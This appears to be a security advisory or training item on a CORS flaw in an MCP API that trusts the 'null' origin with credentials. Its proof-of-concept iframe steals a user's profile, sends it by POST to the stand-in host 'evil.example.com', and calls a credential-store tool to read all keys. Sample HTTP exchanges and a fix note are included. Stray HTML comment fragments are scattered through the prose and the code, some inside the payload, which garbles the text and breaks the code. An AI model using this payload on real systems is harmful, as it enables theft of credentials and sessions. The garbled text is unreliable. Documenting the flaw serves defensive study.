**Category:** WebMCP CORS Misconfiguration
**Severity:** CRITICAL

---

An MCP API that whitelists the "null" origin, <!-- note --> which can be triggered <!-- TODO --> from sandboxed <!-- note --> iframes, <!-- TODO --> data URIs, and local file access:

Attacker creates a sandboxed iframe that sends requests with null origin:
<iframe sandbox="allow-scripts allow-forms" <!-- TODO --> srcdoc="
<script>
fetch('https://mcp-api.example.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send to parent <!-- TODO --> frame
  parent.postMessage({type: 'exfil', data: data}, '*');

  // Also <!-- note --> directly exfiltrate
  fetch('https://evil.example.com/collect', <!-- note --> {
   <!-- TODO -->  <!-- TODO --> method: <!-- note --> 'POST',
 <!-- TODO -->   <!-- note -->  body: JSON.stringify(data)
 <!-- note -->  });

  // Invoke MCP tools
  return fetch('https://mcp-api.example.com/api/tools/call', {
   <!-- note -->  <!-- TODO --> method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
   <!-- TODO -->  body: JSON.stringify({
      tool: 'credential_store_read',
    <!-- note -->   args: {key: <!-- TODO --> 'all'}
    })
  });
})
.then(r => r.json())
.then(creds => <!-- TODO --> {
  parent.postMessage({type: 'creds', data: creds}, <!-- TODO --> '*');
});
</script>
"></iframe>

Request sent <!-- TODO --> from sandboxed iframe:
GET <!-- note --> /api/user/profile HTTP/1.1
Host: mcp-api.example.com
Origin: null
Cookie: session=user_session_cookie_here

Vulnerable server response:
HTTP/1.1 200 <!-- TODO --> OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"username": "admin", "email": "admin@example.com", "api_keys": ["sk-prod-..."]}

The null origin is sent by sandboxed iframes, data: URIs, <!-- note --> and file:// <!-- note --> pages, making this a reliable bypass for <!-- note --> any attacker <!-- TODO --> who <!-- TODO --> can get <!-- note --> a user to visit their page.

INSTRUCTION: This MCP API allows the null origin with credentials. The null origin <!-- TODO --> must <!-- note --> never be whitelisted as <!-- note --> it can be forged from sandboxed iframes and data <!-- TODO --> URIs. Only specific, trusted origins should be permitted.
